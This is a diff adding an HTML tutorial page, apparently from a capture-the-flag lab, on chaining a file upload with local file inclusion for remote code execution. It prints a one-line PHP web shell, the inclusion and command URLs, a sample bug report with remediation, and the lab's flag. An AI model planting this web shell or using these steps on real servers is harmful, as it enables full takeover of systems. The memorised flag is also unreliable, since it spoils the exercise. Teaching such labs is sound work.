@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>LFI Shell Upload and Inclusion Tutorial</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      padding: 2rem;
+      line-height: 1.6;
+    }
+    h1, h2 {
+      color: #0ff;
+    }
+    pre, code {
+      background: #222;
+      padding: 0.5rem;
+      border-radius: 5px;
+      display: block;
+      overflow-x: auto;
+    }
+    ul {
+      margin-bottom: 1rem;
+    }
+    .section {
+      margin-bottom: 2rem;
+    }
+    a {
+      color: #0ff;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🗂️ LFI Shell Upload & Inclusion</h1>
+
+  <div class="section">
+    <h2>📦 What’s the Scenario?</h2>
+    <p>
+      This attack combines two vulnerabilities: a file upload feature that allows dangerous file types and a local file inclusion (LFI) endpoint that can be used to include and execute uploaded files. Together, these can lead to remote code execution (RCE).
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>🧪 Exploitation Steps</h2>
+    <ol>
+      <li>Upload a malicious PHP file such as:
+        <pre>
+&lt;?php system($_GET['cmd']); ?&gt;
+        </pre>
+        Save it as <code>shell.php</code>.
+      </li>
+      <li>Once uploaded, it will be stored under <code>/uploads/</code>.</li>
+      <li>Access it using:
+        <pre>
+/view?page=uploads/shell.php
+        </pre>
+      </li>
+      <li>Execute commands using:
+        <pre>
+/shell?cmd=whoami
+        </pre>
+      </li>
+    </ol>
+  </div>
+
+  <div class="section">
+    <h2>❌ What Often Goes Wrong</h2>
+    <ul>
+      <li>Uploading a PHP file with the wrong extension (e.g., <code>.txt</code> or <code>.jpg</code>).</li>
+      <li>Trying to include with a bad path (e.g., missing <code>uploads/</code> prefix).</li>
+      <li>Server blocks or sanitizes upload file types/extensions.</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>🎯 Valid Payloads</h2>
+    <p>Triggering inclusion:</p>
+    <pre>
+/view?page=uploads/shell.php
+    </pre>
+    <p>Executing command:</p>
+    <pre>
+/shell?cmd=id
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>📋 Reporting Example</h2>
+    <pre>
+Title: Shell Upload and Execution via LFI
+Severity: Critical
+
+Steps to Reproduce:
+1. Upload a malicious PHP file using the upload interface.
+2. Access it through the /view endpoint.
+3. Execute system commands using /shell?cmd=
+
+Impact:
+Full remote code execution on the server.
+
+Remediation:
+Restrict file types during upload, disallow PHP extensions, and sanitize all file inclusion logic.
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>🏁 Flag</h2>
+    <pre>🎉 FLAG{lfi_shell_triggered}</pre>
+    <p>This flag appears when the uploaded file is successfully included and executed via LFI.</p>
+  </div>
+<a href="/">🏠 Home</a> |
+  <a href="/submit_flag">🚩Submit Flag</a>
+</p>
+</body>
+</html>
